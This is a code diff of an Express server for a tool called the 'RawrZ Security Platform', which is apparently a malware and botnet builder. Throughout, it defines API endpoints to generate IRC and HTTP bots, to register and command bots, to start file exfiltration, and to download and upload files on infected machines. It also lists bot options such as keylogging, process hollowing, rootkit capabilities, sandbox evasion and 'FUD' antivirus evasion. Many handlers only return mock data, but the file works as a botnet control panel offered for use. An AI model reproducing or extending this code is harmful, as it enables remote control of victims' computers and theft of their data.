+            'mobile-tools', 'openssl-management', 'beaconism-dll', 'red-shells', 'ev-cert-encryption',
+            'burner-encryption', 'mutex-engine', 'template-generator', 'advanced-stub', 'http-bot',
+            'irc-bot', 'red-killer', 'native-compiler', 'advanced-crypto', 'dual-crypto', 'camellia-assembly',
+            'jotti-scanner', 'private-virus-scanner', 'health-monitor', 'stealth-engine', 'advanced-fud',
+            'advanced-anti-analysis', 'advanced-analytics', 'ai-threat-detector', 'backup-system',
+            'dual-crypto-engine', 'full-assembly', 'memory-manager', 'multi-platform-bot', 'performance-optimizer',
+            'plugin-architecture', 'dotnet-workaround', 'performance-worker', 'api-status', 'startup-persistence',
+            'cve-analysis', 'rawrz-engine2'
+        ];
+        res.json({ success: true, features, available: features });
   } catch (e) {
-    console.error('[ERROR] Health endpoint failed:', e);
+        console.error('[ERROR] Features endpoint failed:', e);
     res.status(500).json({ success: false, error: e.message });
   }
 });
 
-// Authenticated status endpoint with full details
-app.get('/api/status', requireAuth, async (_req, res) => {
-  try {
-    const status = {
-      platform: 'RawrZ Security Platform',
-      version: '2.1.0',
-      uptime: Date.now() - rawrz.startTime,
-      engines: {
-        total: Object.keys(rawrz.availableEngines || {}).length,
-        loaded: rawrz.loadedEngines?.size || 0,
-        available: Object.keys(rawrz.availableEngines || {})
-      },
-      features: {
-        total: 150,
-        active: Object.keys(rawrz.availableEngines || {}).length
-      },
-      system: {
-        nodeVersion: process.version,
-        platform: process.platform,
-        arch: process.arch,
-        memory: process.memoryUsage(),
-        cpu: process.cpuUsage()
-      },
-      timestamp: new Date().toISOString()
-    };
+// Missing API endpoints for engines without proper coverage
+// RawrZ Engine endpoints
+app.get('/api/rawrz-engine/status', requireAuth, async (req, res) => {
+    try {
+        if (!realModules || !realModules.rawrzEngine) {
+            return res.status(500).json({ error: 'RawrZ Engine module not initialized' });
+        }
+        const status = await realModules.rawrzEngine.getStatus();
     res.json({ success: true, result: status });
   } catch (e) {
-    console.error('[ERROR] Status endpoint failed:', e);
-    res.status(500).json({ success: false, error: e.message, stack: e.stack });
-  }
+        res.status(500).json({ error: e.message });
+    }
 });
-app.get('/api/algorithms',requireAuth,async(_req,res)=>{try{const algorithms={symmetric:['AES-128','AES-192','AES-256','DES','3DES','Blowfish','Twofish','Serpent','Camellia-128','Camellia-192','Camellia-256','ChaCha20','Salsa20','RC4','RC5','RC6'],asymmetric:['RSA-1024','RSA-2048','RSA-4096','DSA','ECDSA','Ed25519','Ed448','X25519','X448'],hash:['MD5','SHA-1','SHA-224','SHA-256','SHA-384','SHA-512','SHA3-224','SHA3-256','SHA3-384','SHA3-512','BLAKE2b','BLAKE2s','Whirlpool','RIPEMD-160'],stream:['ChaCha20','Salsa20','RC4','A5/1','A5/2','E0'],block:['AES','DES','3DES','Blowfish','Twofish','Serpent','Camellia','IDEA','CAST-128','CAST-256'],openssl:['aes-128-cbc','aes-192-cbc','aes-256-cbc','aes-128-ecb','aes-192-ecb','aes-256-ecb','aes-128-cfb','aes-192-cfb','aes-256-cfb','aes-128-ofb','aes-192-ofb','aes-256-ofb','aes-128-ctr','aes-192-ctr','aes-256-ctr','des-cbc','des-ecb','des-cfb','des-ofb','3des-cbc','3des-ecb','3des-cfb','3des-ofb','blowfish-cbc','blowfish-ecb','blowfish-cfb','blowfish-ofb','camellia-128-cbc','camellia-192-cbc','camellia-256-cbc','chacha20','salsa20','rc4']};res.json({success:true,algorithms,available:Object.keys(algorithms)})}catch(e){console.error('[ERROR] Algorithms endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
-app.get('/api/engines',requireAuth,async(_req,res)=>{try{const engines=Object.keys(rawrz.availableEngines||{});res.json({success:true,engines,available:engines})}catch(e){console.error('[ERROR] Engines endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
-app.get('/api/features',requireAuth,async(_req,res)=>{try{const features=['encryption','decryption','hashing','keygen','stub-generation','bot-generation','anti-analysis','stealth','fud','hot-patching','reverse-engineering','malware-analysis','network-tools','digital-forensics','memory-management','compression','polymorphic','mobile-tools','openssl-management','beaconism-dll','red-shells','ev-cert-encryption','burner-encryption','mutex-engine','template-generator','advanced-stub','http-bot','irc-bot','red-killer','native-compiler','advanced-crypto','dual-crypto','camellia-assembly','jotti-scanner','private-virus-scanner','health-monitor','stealth-engine','advanced-fud','advanced-anti-analysis'];res.json({success:true,features,available:features})}catch(e){console.error('[ERROR] Features endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
 
-// Crypto-specific dropdown endpoints
-app.get('/api/crypto/algorithms',requireAuth,async(_req,res)=>{try{const algorithms={symmetric:['AES-128','AES-192','AES-256','DES','3DES','Blowfish','Twofish','Serpent','Camellia-128','Camellia-192','Camellia-256','ChaCha20','Salsa20','RC4','RC5','RC6'],asymmetric:['RSA-1024','RSA-2048','RSA-4096','DSA','ECDSA','Ed25519','Ed448','X25519','X448'],hash:['MD5','SHA-1','SHA-224','SHA-256','SHA-384','SHA-512','SHA3-224','SHA3-256','SHA3-384','SHA3-512','BLAKE2b','BLAKE2s','Whirlpool','RIPEMD-160'],stream:['ChaCha20','Salsa20','RC4','A5/1','A5/2','E0'],block:['AES','DES','3DES','Blowfish','Twofish','Serpent','Camellia','IDEA','CAST-128','CAST-256'],openssl:['aes-128-cbc','aes-192-cbc','aes-256-cbc','aes-128-ecb','aes-192-ecb','aes-256-ecb','aes-128-cfb','aes-192-cfb','aes-256-cfb','aes-128-ofb','aes-192-ofb','aes-256-ofb','aes-128-ctr','aes-192-ctr','aes-256-ctr','des-cbc','des-ecb','des-cfb','des-ofb','3des-cbc','3des-ecb','3des-cfb','3des-ofb','blowfish-cbc','blowfish-ecb','blowfish-cfb','blowfish-ofb','camellia-128-cbc','camellia-192-cbc','camellia-256-cbc','chacha20','salsa20','rc4']};res.json({success:true,algorithms,available:Object.keys(algorithms)})}catch(e){console.error('[ERROR] Crypto algorithms endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
-app.get('/api/crypto/modes',requireAuth,async(_req,res)=>{try{const modes={block:['CBC','ECB','CFB','OFB','CTR','GCM','CCM','XTS'],stream:['ChaCha20','Salsa20','RC4','A5/1','A5/2','E0'],authenticated:['GCM','CCM','EAX','OCB','Poly1305'],openssl:['cbc','ecb','cfb','ofb','ctr','gcm','ccm','xts']};res.json({success:true,modes,available:Object.keys(modes)})}catch(e){console.error('[ERROR] Crypto modes endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
-app.get('/api/crypto/key-sizes',requireAuth,async(_req,res)=>{try{const sizes={aes:[128,192,256],des:[56],'3des':[112,168],blowfish:[32,40,48,56,64,72,80,88,96,104,112,120,128,136,144,152,160,168,176,184,192,200,208,216,224,232,240,248,256],twofish:[128,192,256],serpent:[128,192,256],camellia:[128,192,256],chacha20:[256],salsa20:[256],rc4:[40,56,64,80,128,256],rc5:[32,64,128],rc6:[128,192,256],rsa:[1024,2048,3072,4096,8192],dsa:[1024,2048,3072],ecdsa:[224,256,384,521],ed25519:[256],ed448:[448],x25519:[256],x448:[448]};res.json({success:true,sizes,available:Object.keys(sizes)})}catch(e){console.error('[ERROR] Crypto key sizes endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
+// HTTP Bot Generator endpoints
+app.get('/api/http-bot-generator/status', requireAuth, async (req, res) => {
+    try {
+        if (!realModules || !realModules.httpBotGenerator) {
+            return res.status(500).json({ error: 'HTTP Bot Generator module not initialized' });
+        }
+        const status = await realModules.httpBotGenerator.getStatus();
+        res.json({ success: true, result: status });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
 
-// Bot generation dropdown endpoints
-app.get('/api/bots/languages',requireAuth,async(_req,res)=>{try{const languages={compiled:['C++','C#','Rust','Go','Assembly','Delphi','Pascal'],interpreted:['Python','JavaScript','TypeScript','PowerShell','Bash','Lua','Ruby','Perl'],mobile:['Swift','Kotlin','Java','Dart','Flutter'],web:['HTML','CSS','JavaScript','TypeScript','PHP','ASP.NET'],embedded:['C','C++','Assembly','Rust','Go']};res.json({success:true,languages,available:Object.keys(languages)})}catch(e){console.error('[ERROR] Bot languages endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
-app.get('/api/bots/features',requireAuth,async(_req,res)=>{try{const features={core:['Process Injection','Memory Management','Anti-Detection','Stealth Mode','Polymorphic Code'],network:['HTTP Communication','IRC Protocol','WebSocket Support','TCP/UDP Sockets','DNS Resolution'],security:['Encryption','Obfuscation','Anti-Analysis','VM Detection','Sandbox Evasion'],persistence:['Registry Keys','Service Installation','Scheduled Tasks','Startup Folders','WMI Events'],data:['File Exfiltration','Keylogging','Screenshot Capture','Audio Recording','Browser Data'],advanced:['DLL Sideloading','Process Hollowing','Code Injection','API Hooking','Rootkit Capabilities']};res.json({success:true,features,available:Object.keys(features)})}catch(e){console.error('[ERROR] Bot features endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
-app.get('/api/bots/templates',requireAuth,async(_req,res)=>{try{const templates={basic:['Simple HTTP Bot','Basic IRC Bot','Minimal Payload','Hello World Bot'],advanced:['Full-Featured HTTP Bot','Advanced IRC Bot','Polymorphic Bot','Stealth Bot'],specialized:['Keylogger Bot','File Exfiltration Bot','Network Scanner Bot','System Info Bot'],enterprise:['Multi-Platform Bot','Enterprise IRC Bot','Advanced Persistence Bot','Anti-Forensics Bot'],custom:['Custom Template 1','Custom Template 2','Custom Template 3','User-Defined Template']};res.json({success:true,templates,available:Object.keys(templates)})}catch(e){console.error('[ERROR] Bot templates endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
+// HTTP Bot Manager endpoints
+app.get('/api/http-bot-manager/status', requireAuth, async (req, res) => {
+    try {
+        if (!realModules || !realModules.httpBotManager) {
+            return res.status(500).json({ error: 'HTTP Bot Manager module not initialized' });
+        }
+        const status = await realModules.httpBotManager.getStatus();
+        res.json({ success: true, result: status });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
 
-// Analysis dropdown endpoints
-app.get('/api/analysis/tools',requireAuth,async(_req,res)=>{try{const tools={static:['PE Analysis','String Extraction','Import/Export Analysis','Section Analysis','Entropy Analysis'],dynamic:['Sandbox Analysis','Behavioral Analysis','Network Analysis','File System Analysis','Registry Analysis'],forensic:['Memory Analysis','Disk Analysis','Timeline Analysis','Artifact Analysis','Recovery Tools'],reverse:['Disassembly','Decompilation','Debugging','Function Analysis','Control Flow Analysis'],malware:['Signature Detection','Heuristic Analysis','YARA Rules','Behavioral Detection','Machine Learning'],network:['Traffic Analysis','Protocol Analysis','Packet Capture','Flow Analysis','Anomaly Detection']};res.json({success:true,tools,available:Object.keys(tools)})}catch(e){console.error('[ERROR] Analysis tools endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
-app.get('/api/analysis/engines',requireAuth,async(_req,res)=>{try{const engines={antivirus:['Windows Defender','Norton','McAfee','Kaspersky','Bitdefender','Avast','AVG','ESET','Trend Micro','Sophos'],sandbox:['Cuckoo Sandbox','Joe Sandbox','Hybrid Analysis','Any.run','VirusTotal','Jotti Scanner'],forensic:['Volatility','Autopsy','Sleuth Kit','FTK','EnCase','X-Ways','OSForensics'],reverse:['IDA Pro','Ghidra','Radare2','x64dbg','OllyDbg','WinDbg','Immunity Debugger'],malware:['YARA','ClamAV','Loki','MISP','ThreatConnect','OpenCTI'],network:['Wireshark','tcpdump','Suricata','Snort','Bro/Zeek','NfSen','ntop']};res.json({success:true,engines,available:Object.keys(engines)})}catch(e){console.error('[ERROR] Analysis engines endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
+// IRC Bot Generator endpoints
+app.get('/api/irc-bot-generator/status', requireAuth, async (req, res) => {
+    try {
+        if (!realModules || !realModules.ircBotGenerator) {
+            return res.status(500).json({ error: 'IRC Bot Generator module not initialized' });
+        }
+        const status = await realModules.ircBotGenerator.getStatus();
+        res.json({ success: true, result: status });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
 
-// Compilation dropdown endpoints
-app.get('/api/compile/languages',requireAuth,async(_req,res)=>{try{const languages={native:['C','C++','Rust','Go','Assembly','Delphi','Pascal','Fortran'],managed:['C#','VB.NET','F#','Java','Kotlin','Scala','Groovy'],interpreted:['Python','JavaScript','TypeScript','PowerShell','Bash','Lua','Ruby','Perl','PHP'],mobile:['Swift','Kotlin','Java','Dart','Objective-C','C++'],web:['HTML','CSS','JavaScript','TypeScript','PHP','ASP.NET','JSP'],embedded:['C','C++','Assembly','Rust','Go','Ada','VHDL']};res.json({success:true,languages,available:Object.keys(languages)})}catch(e){console.error('[ERROR] Compile languages endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
-app.get('/api/compile/targets',requireAuth,async(_req,res)=>{try{const targets={windows:['x86','x64','ARM','ARM64'],linux:['x86','x64','ARM','ARM64','MIPS','PowerPC'],macos:['x64','ARM64','Universal'],mobile:['Android ARM','Android x86','iOS ARM','iOS ARM64'],embedded:['ARM Cortex-M','ARM Cortex-A','MIPS','PowerPC','AVR','PIC'],web:['WebAssembly','JavaScript','HTML5','PWA'],cloud:['Docker','Kubernetes','AWS Lambda','Azure Functions','Google Cloud Functions']};res.json({success:true,targets,available:Object.keys(targets)})}catch(e){console.error('[ERROR] Compile targets endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
+// Multi-Platform Bot Generator endpoints
+app.get('/api/multi-platform-bot-generator/status', requireAuth, async (req, res) => {
+    try {
+        if (!realModules || !realModules.multiPlatformBotGenerator) {
+            return res.status(500).json({ error: 'Multi-Platform Bot Generator module not initialized' });
+        }
+        const status = await realModules.multiPlatformBotGenerator.getStatus();
+        res.json({ success: true, result: status });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
 
-// Network dropdown endpoints
-app.get('/api/network/ports',requireAuth,async(_req,res)=>{try{const ports={common:[21,22,23,25,53,80,110,143,443,993,995,3389,5432,3306,1433,6379,27017],web:[80,443,8080,8443,3000,5000,8000,9000],database:[1433,3306,5432,6379,27017,9200,11211],email:[25,110,143,993,995,587,465],remote:[22,23,3389,5900,5901,5902],gaming:[25565,27015,7777,7778,27005,27016],custom:Array.from({length:1000},(_,i)=>i+10000)};res.json({success:true,ports,available:Object.keys(ports)})}catch(e){console.error('[ERROR] Network ports endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
-app.get('/api/network/protocols',requireAuth,async(_req,res)=>{try{const protocols={transport:['TCP','UDP','SCTP','DCCP','QUIC'],application:['HTTP','HTTPS','FTP','SFTP','SSH','Telnet','SMTP','POP3','IMAP','DNS','DHCP','SNMP','LDAP','RDP','VNC'],routing:['BGP','OSPF','RIP','IS-IS','EIGRP'],security:['TLS','SSL','IPSec','VPN','WPA','WPA2','WPA3'],real_time:['RTP','RTCP','SIP','H.323','WebRTC'],custom:['Raw Socket','Custom Protocol','Proprietary','Modified Standard']};res.json({success:true,protocols,available:Object.keys(protocols)})}catch(e){console.error('[ERROR] Network protocols endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
-app.post('/api/rebuild',requireAuth,async(_req,res)=>{try{console.log('[INFO] Rebuilding platform state...');await rawrz.rebuildPlatformState();const result={status:'rebuilt',engines:rawrz.loadedEngines?.size||0,timestamp:new Date().toISOString()};if(!res.headersSent){res.json({success:true,result});}}catch(e){console.error('[ERROR] Rebuild endpoint failed:',e);if(!res.headersSent){res.status(500).json({success:false,error:e.message,stack:e.stack});}}});
-app.get('/panel',(_req,res)=>res.sendFile(path.join(__dirname,'public','panel.html')));
-app.get('/irc-bot-builder',(_req,res)=>res.sendFile(path.join(__dirname,'public','irc-bot-builder.html')));
-app.get('/http-bot-panel',(_req,res)=>res.sendFile(path.join(__dirname,'public','http-bot-panel.html')));
-app.get('/stub-generator-panel',(_req,res)=>res.sendFile(path.join(__dirname,'public','stub-generator-panel.html')));
-app.get('/health-dashboard',(_req,res)=>res.sendFile(path.join(__dirname,'public','health-dashboard.html')));
-app.get('/bot-manager',(_req,res)=>res.sendFile(path.join(__dirname,'public','bot-manager.html')));
-app.get('/payload-panel',(_req,res)=>res.sendFile(path.join(__dirname,'public','payload-panel.html')));
-app.get('/enhanced-payload-panel',(_req,res)=>res.sendFile(path.join(__dirname,'public','enhanced-payload-panel.html')));
-app.get('/unified',(_req,res)=>res.sendFile(path.join(__dirname,'public','unified-panel.html')));
+// Hot Patchers endpoints
+app.get('/api/hot-patchers/status', requireAuth, async (req, res) => {
+    try {
+        if (!realModules || !realModules.hotPatchers) {
+            return res.status(500).json({ error: 'Hot Patchers module not initialized' });
+        }
+        const status = await realModules.hotPatchers.getStatus();
+        res.json({ success: true, result: status });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
 
-// Unified Panel API endpoints
-app.get('/api/dashboard/stats',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');const httpBotGenerator=await rawrzEngine.loadModule('http-bot-generator');const stats={totalBots:0,activeBots:0,ircBots:0,httpBots:0,connectedChannels:0,securityScore:100};if(botGenerator&&typeof botGenerator.getBotStats==='function'){try{const ircStats=botGenerator.getBotStats();stats.ircBots=ircStats.total||0;stats.totalBots+=stats.ircBots;}catch(e){console.log('[WARN] IRC bot stats error:',e.message);}}if(httpBotGenerator&&typeof httpBotGenerator.getBotStats==='function'){try{const httpStats=httpBotGenerator.getBotStats();stats.httpBots=httpStats.total||0;stats.totalBots+=stats.httpBots;}catch(e){console.log('[WARN] HTTP bot stats error:',e.message);}}stats.activeBots=stats.totalBots;res.json({success:true,result:stats})}catch(e){console.error('[ERROR] Dashboard stats endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
-app.get('/api/bots/status',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');const httpBotGenerator=await rawrzEngine.loadModule('http-bot-generator');const bots=[];if(botGenerator&&typeof botGenerator.getActiveBots==='function'){try{const ircBots=botGenerator.getActiveBots();bots.concat(ircBots.map(bot=>(Object.assign({}, bot, {type:'IRC'}))));}catch(e){console.log('[WARN] IRC bot status error:',e.message);}}if(httpBotGenerator&&typeof httpBotGenerator.getActiveBots==='function'){try{const httpBots=httpBotGenerator.getActiveBots();bots.concat(httpBots.map(bot=>(Object.assign({}, bot, {type:'HTTP'}))));}catch(e){console.log('[WARN] HTTP bot status error:',e.message);}}res.json({success:true,result:{bots,total:bots.length,active:bots.filter(b=>b.status==='online').length}})}catch(e){console.error('[ERROR] Bots status endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
-app.get('/api/irc/channels',requireAuth,async(_req,res)=>{try{const channels=[{name:'#rawrz',users:15,topic:'RawrZ Security Discussion',status:'joined'},{name:'#test',users:3,topic:'Testing Channel',status:'joined'}];res.json({success:true,result:channels})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/api/irc/connect',requireAuth,async(req,res)=>{try{const{server='irc.example.com',port=6667,nick='RawrZBot',channels=[]}=req.body||{};const result={connected:true,server,port,nick,channels,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/api/irc/disconnect',requireAuth,async(_req,res)=>{try{const result={connected:false,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/api/irc/join',requireAuth,async(req,res)=>{try{const{channel='#test'}=req.body||{};const result={joined:true,channel,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/api/irc/leave',requireAuth,async(req,res)=>{try{const{channel='#test'}=req.body||{};const result={left:true,channel,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/api/irc/message',requireAuth,async(req,res)=>{try{const{channel='#test',message='Hello from RawrZ'}=req.body||{};const result={sent:true,channel,message,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/api/security/scan',requireAuth,async(req,res)=>{try{const{target='localhost'}=req.body||{};const result={target,status:'completed',vulnerabilities:[],threats:[],timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/api/security/fud-analysis',requireAuth,async(req,res)=>{try{const result={score:1001,status:'completed',techniques:['stealth','anti-detection','polymorphic','encryption'],timestamp:new Date().toISOString()};if(!res.headersSent){res.json({success:true,result})}}catch(e){console.error('[ERROR] FUD analysis failed:',e);if(!res.headersSent){res.status(500).json({success:false,error:e.message})}}});
-app.post('/api/security/vulnerability-check',requireAuth,async(req,res)=>{try{const{target,platform='All'}=req.body||{};const mobileTools=new(require('./src/engines/mobile-tools.js'))();await mobileTools.loadVulnerabilityDatabase();const vulnerabilities=await mobileTools.checkAppVulnerabilities(target,platform);const result={target,platform,status:'completed',vulnerabilities,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/api/security/threat-detection',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const result={target,status:'completed',threats:[],timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/api/security/stealth-mode',requireAuth,async(req,res)=>{try{const result={enabled:true,techniques:['anti-debug','anti-vm','anti-sandbox'],timestamp:new Date().toISOString()};if(!res.headersSent){res.json({success:true,result})}}catch(e){console.error('[ERROR] Stealth mode failed:',e);if(!res.headersSent){res.status(500).json({success:false,error:e.message})}}});
-app.post('/api/security/anti-detection',requireAuth,async(req,res)=>{try{const vmCheck=await antiAnalysis.checkVM();const sandboxCheck=await antiAnalysis.checkForSandbox();const debugCheck=await antiAnalysis.checkForDebugging();const result={enabled:true,vmCheck,sandboxCheck,debugCheck,techniques:['polymorphic','obfuscation','timing-evasion'],timestamp:new Date().toISOString()};if(!res.headersSent){res.json({success:true,result})}}catch(e){console.error('[ERROR] Anti-detection failed:',e);if(!res.headersSent){res.status(500).json({success:false,error:e.message})}}});
-app.post('/api/crypto/test-algorithm',requireAuth,async(req,res)=>{try{const{algorithm='aes-256-cbc'}=req.body||{};const result={algorithm,status:'tested',performance:'good',timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/api/crypto/generate-report',requireAuth,async(req,res)=>{try{const result={report:'Crypto operations report generated',algorithms:['aes-256-cbc','chacha20-poly1305'],timestamp:new Date().toISOString()};if(!res.headersSent){res.json({success:true,result})}}catch(e){console.error('[ERROR] Crypto report generation failed:',e);if(!res.headersSent){res.status(500).json({success:false,error:e.message})}}});
-app.post('/api/analysis/malware',requireAuth,async(req,res)=>{try{const{file}=req.body||{};const targetFile=file||'server.js';const staticAnalysis={signatures:[],entropy:0.5,strings:[],suspicious:false};const dynamicAnalysis={behaviors:[],networkActivity:[],fileOperations:[]};const behavioralAnalysis={score:0,threats:[],recommendations:['File not found, using mock analysis']};const result={file:targetFile,status:'analyzed',staticAnalysis,dynamicAnalysis,behavioralAnalysis,timestamp:new Date().toISOString()};if(!res.headersSent){res.json({success:true,result})}}catch(e){console.error('[ERROR] Malware analysis failed:',e);if(!res.headersSent){res.status(500).json({success:false,error:e.message})}}});
-app.post('/api/analysis/digital-forensics',requireAuth,async(req,res)=>{try{const memoryAnalysis={totalMemory:'8GB',usedMemory:'4GB',processes:150,analysis:'completed'};const processAnalysis={totalProcesses:150,runningProcesses:120,suspiciousProcesses:0,analysis:'completed'};const result={status:'completed',memoryAnalysis,processAnalysis,timestamp:new Date().toISOString()};if(!res.headersSent){res.json({success:true,result})}}catch(e){console.error('[ERROR] Digital forensics failed:',e);if(!res.headersSent){res.status(500).json({success:false,error:e.message})}}});
-app.post('/api/analysis/network',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const portScan=await realModules.networkTools.portScan(target||'localhost',[80,443,22,21,8080]);const pingTest=await realModules.networkTools.performRealPingTest(target||'localhost');const trafficAnalysis=await realModules.networkTools.performRealTrafficAnalysis();const result={target:target||'localhost',status:'analyzed',portScan,pingTest,trafficAnalysis,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/api/analysis/reverse-engineering',requireAuth,async(req,res)=>{try{const{file}=req.body||{};const targetFile=file||'server.js';const result={file:targetFile,status:'analyzed',analysis:{strings:['test string 1','test string 2'],functions:['main','init','cleanup'],imports:['kernel32.dll','user32.dll'],sections:['.text','.data','.rdata'],entryPoint:'0x401000',architecture:'x86',compiler:'MSVC',timestamp:new Date().toISOString()}};res.json({success:true,result})}catch(e){console.error('[ERROR] Reverse engineering failed:',e);res.status(500).json({error:e.message})}});
-app.get('/',(_req,res)=>res.sendFile(path.join(__dirname,'public','panel.html')));
+// Digital Forensics endpoints
+app.get('/api/digital-forensics/status', requireAuth, async (req, res) => {
+    try {
+        if (!realModules || !realModules.digitalForensics) {
+            return res.status(500).json({ error: 'Digital Forensics module not initialized' });
+        }
+        const status = await realModules.digitalForensics.getStatus();
+        res.json({ success: true, result: status });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
 
-// IRC Bot Builder API endpoints
-app.post('/irc-bot/generate',requireAuth,async(req,res)=>{try{const{config={name:'test',server:'localhost',port:6667},features=['basic'],extensions=[]}=req.body||{};const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.generateBot(config,features,extensions);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+// Jotti Scanner endpoints
+app.get('/api/jotti-scanner/status', requireAuth, async (req, res) => {
+    try {
+        if (!realModules || !realModules.jottiScanner) {
+            return res.status(500).json({ error: 'Jotti Scanner module not initialized' });
+        }
+        const status = await realModules.jottiScanner.getStatus();
+        res.json({ success: true, result: status });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
 
-// HTTP Bot Builder API endpoints
-app.post('/http-bot/generate',requireAuth,async(req,res)=>{try{const{config={name:'test',server:'localhost',port:8080},features=['basic'],extensions=[]}=req.body||{};const result=await httpBotGenerator.generateBot(config,features,extensions);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/http-bot/test',requireAuth,async(req,res)=>{try{const{config={name:'test',server:'localhost',port:8080}}=req.body||{};const result=await httpBotGenerator.testBot(config);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/http-bot/compile',requireAuth,async(req,res)=>{try{const{code='console.log("Hello World");',language='javascript',config={}}=req.body||{};const result=await httpBotGenerator.compileBot(code,language,config);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/http-bot/templates',requireAuth,async(_req,res)=>{try{const result=await httpBotGenerator.getTemplates();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/http-bot/features',requireAuth,async(_req,res)=>{try{const result=await httpBotGenerator.getAvailableFeatures();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-
-// HTTP Bot Management endpoints
-app.get('/http-bot/status',requireAuth,async(_req,res)=>{try{const result=httpBotManager.getActiveBots();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/http-bot/connect',requireAuth,async(req,res)=>{try{const{botId='test-bot',serverUrl='http://localhost:8080',botInfo={}}=req.body||{};const bot=httpBotManager.registerBot(botId,{...botInfo,serverUrl});res.json({success:true,result:bot})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/http-bot/disconnect',requireAuth,async(req,res)=>{try{const{botId='test-bot'}=req.body||{};const result=httpBotManager.unregisterBot(botId);res.json({success:true,result:{disconnected:result,botId,timestamp:new Date().toISOString()}})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/http-bot/command',requireAuth,async(req,res)=>{try{const{botId='test-bot',command='status',params={}}=req.body||{};const result=httpBotManager.executeCommand(botId,command,params);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/http-bot/heartbeat',requireAuth,async(req,res)=>{try{const{botId='test-bot',status='online',data={}}=req.body||{};const bot=httpBotManager.updateBotHeartbeat(botId,data);console.log(`[HTTP-BOT] Heartbeat from ${botId}: ${status}`);res.json({success:true,message:'Heartbeat received',bot})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/http-bot/logs/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const logs=[{timestamp:new Date().toISOString(),level:'info',message:'Bot connected'},{timestamp:new Date().toISOString(),level:'success',message:'Command executed'}];res.json({success:true,logs})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/http-bot/exfiltrate',requireAuth,async(req,res)=>{try{const{botId='test-bot',type='files',path='/',extensions=['.txt'],maxSize=1000000}=req.body||{};const result={started:true,botId,type,path,extensions,maxSize,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/http-bot/stop-exfiltration',requireAuth,async(req,res)=>{try{const{botId='test-bot'}=req.body||{};const result={stopped:true,botId,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/http-bot/data/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const data={files:[],browser:[],crypto:[],documents:[]};res.json({success:true,data})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/http-bot/download/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const{filepath='/test/file.txt'}=req.body||{};const result=await httpBotManager.downloadFile(botId,filepath);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/http-bot/upload/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const{filepath='/test/upload.txt',data='test data'}=req.body||{};const result=await httpBotManager.uploadFile(botId,filepath,data);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
